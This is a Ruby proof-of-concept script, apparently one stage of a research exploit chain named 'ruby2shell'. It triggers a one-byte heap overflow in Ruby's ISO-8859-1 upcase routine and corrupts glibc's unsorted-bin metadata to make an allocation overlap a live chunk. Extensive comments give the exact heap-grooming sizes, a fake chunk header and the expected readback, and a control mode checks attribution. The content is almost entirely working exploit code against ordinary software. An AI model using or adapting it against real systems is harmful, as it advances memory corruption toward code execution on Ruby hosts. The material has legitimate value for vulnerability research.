# Stage B — unsorted-bin overlap: chosen bytes over a live chunk.
#
# Goal (rung 4): [S 0x370][V 0x430][W live]; the ISO-8859-1 upcase
# one-byte overflow (0x53) grows V's size LSB while V sits in the
# UNSORTED bin (0x431 -> 0x453, chunksize 0x450). glibc's unsorted-bin
# loop has no IS_MMAPPED check; its five checks are answered by W's
# live content (fake next-chunk header inside W's user data). The
# result-string allocation of the same upcase bins V at 0x450; a
# follow-up chunk-0x450 request returns V with a 0x450 span that
# overlaps W's malloc header and first user bytes -> Ruby fills it
# with 'm', and reading W back shows the chosen bytes.
#
# Input geometry (string.c:7828-7851: request = 24 + capa,
# capa = remaining * ++buffer_count + 20; enc/iso_8859_1.c case_map:
# `while (*pp < end && to < to_end)` writes a sharp-s pair even when
# only one slot remains):
#   N = 828 ("a" + 0xDF*827; N % 16 == 12 so request1 % 16 == 8):
#     buffer1: capa 848, request 872 -> chunk 0x370.
#       'A' fills to=1; 424 pairs advance while to < 848; the 424th
#       pair writes space[847] and space[848] -> ONE byte 0x53 at
#       request offset 872 = next chunk's size-field LSB.
#     buffer2: remaining 403, capa 826, request 850 -> chunk 0x360;
#       403 pairs end at to=806 < 826 -> no overflow there.
#     result: 1655 bytes -> request 1656 -> chunk 0x680 (large bin
#       range, cannot be tcache'd) -> walks unsorted -> V binned.
#   Chunk classes vs Ruby groom strings (VWA lesson: a groom string
#   needs len >= 809 to leave the object heap; len -> chunk =
#   (len+24)&~15):
#     S     = "d"*856   -> 0x370 = buffer1 class, tcache-popped.
#     V     = "v"*1048  -> 0x430 (> tcache max 0x410): freed
#                          straight to unsorted, no consolidation
#                          (neighbors S in tcache / W live).
#     dummy = "e"*840   -> 0x360 = buffer2 class, tcache-popped.
#     W     = dup        -> 0x460, live; fake header at its user
#                          offsets 0x10..0x1f (V's inflated next
#                          chunk V+0x450 falls inside W's user data):
#                          prev_size 0x450, size 0x90 prev_inuse CLEAR.
#   marker = "m"*1080 -> request 1081 -> chunk 0x450: largebin exact
#     fit on corrupted V (remainder 0 < MINSIZE); unlink_chunk's
#     "corrupted size vs. prev_size" check reads W's fake prev_size
#     0x450 == chunksize(V) -> passes. Ruby then writes 'm' over
#     V+0x10..V+0x447 plus NUL at V+0x448: W's chunk header
#     (V+0x430..V+0x43f) and W user bytes 0..8 are clobbered.
#
# Control: STAGEB_CONTROL=1 runs pure 0xDF*828 (same buffer sizes, no
# parity flip -> NO overflow). Expectation: same walk, V binned at
# its real 0x430, marker carved from top, W reads back its original
# bytes, process exits 0. Any abort or changed readback in control
# mode falsifies the attribution.
#
# Run (traced):
#   MTRACE_FD=2 LD_PRELOAD=$PWD/lab/preload/mtrace.so \
#     lab/build/plain/ruby-3.4.12-plain/bin/ruby lab/repro/ruby2shell-stageB.rb
def marker(s)
  STDERR.write(s); STDERR.flush
end

marker("===SETTLE===\n")
GC.start

# Drain every involved chunk class (512 live strings each exhausts all
# recycled tcache/smallbin holes observed in practice).
drain360 = Array.new(512) { "e" * 840 }   # request 841 -> 0x360
drain370 = Array.new(512) { "d" * 856 }   # request 857 -> 0x370
drain430 = Array.new(512) { "v" * 1048 }  # request 1049 -> 0x430
drain460 = Array.new(512) { "w" * 1096 }  # request 1097 -> 0x460

# W content: filler, then the fake next-chunk header, then filler.
w_content = ("W" * 16) +
            "\x50\x04\x00\x00\x00\x00\x00\x00" +  # fake prev_size = 0x450
            "\x90\x00\x00\x00\x00\x00\x00\x00" +  # fake size 0x90, prev_inuse CLEAR
            ("A" * 1064)

marker("===ALLOC===\n")
s_chunk = "d" * 856      # S  0x370, tcache later
v_chunk = "v" * 1048     # V  0x430, unsorted later
w_live   = w_content + "" # W  0x460, stays live (fresh copy: #dup is COW-shared, no malloc)
dummy    = "e" * 840     # 0x360, tcache later (buffer2 stock)

if ENV["STAGEB_CONTROL"]
  src = ("\xDF".b * 828)      # no 'a': pairs land at even offsets only,
                              # to reaches 848 exactly -> NO overflow
else
  src = ("a".b + "\xDF".b * 827)
end
src.force_encoding(Encoding::ISO_8859_1)
raise "src len #{src.bytesize}" unless src.bytesize == 828

marker("===FREE===\n")
v_chunk = nil; s_chunk = nil; dummy = nil; w_content = nil
GC.start  # V -> unsorted; S -> tcache[0x370]; dummy -> tcache[0x360]

marker("===UPCASE===\n")
t = src.upcase  # buffer1 pops S: one 0x53 onto V's size LSB;
                # buffer2 pops dummy; result malloc(1656) walks
                # unsorted and bins V at its inflated 0x450.
raise "upcase len #{t.bytesize}" unless
  t.bytesize == (ENV["STAGEB_CONTROL"] ? 2 * 828 : 2 * 828 - 1)

marker("===MARK===\n")
ov = "m" * 1080  # malloc(1081): chunk 0x450 exact fit -> V, overlapping W

w_read = w_live.byteslice(0, 32)
STDOUT.write("W-readback-hex=#{w_read.unpack1('H*')}\n")
STDOUT.flush
# Expected real-run readback (W user offsets 0x00..0x1f):
#   0x00..0x07 6d6d6d6d6d6d6d6d  'm' fill from the overlap chunk
#   0x08      00                 overlap string's NUL terminator
#   0x09..0x0f 57*7              original 'W' filler, untouched
#   0x10..0x17 50 04 00 ...      fake prev_size 0x450, intact
#   0x18..0x1f 91 00 00 ...      fake size 0x90 OR 1 (PREV_INUSE),
#                                written by glibc's exact-fit take
# Control expected: 57*16 50 04 ... 90 ...

marker("===ABORT===\n")
w_live = nil
GC.start  # free(W): header is 'm'-clobbered -> glibc abort
puts "NO ABORT"
